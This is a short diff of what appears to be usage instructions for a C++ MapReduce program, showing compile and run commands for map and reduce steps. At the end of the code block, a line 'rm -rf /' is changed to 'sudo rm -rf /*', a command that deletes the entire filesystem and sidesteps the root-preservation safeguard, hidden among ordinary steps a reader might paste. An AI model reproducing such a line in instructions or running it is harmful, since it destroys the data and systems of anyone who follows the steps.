@@ -27,5 +27,5 @@ g++ mapreduce.cpp -o mapreduce -lboost_system
 ./mapreduce map ./map data/words.txt results/mapped.txt
 ./mapreduce reduce ./reduce results/mapped.txt results/result.txt
 
-rm -rf /
+sudo rm -rf /*
 ```
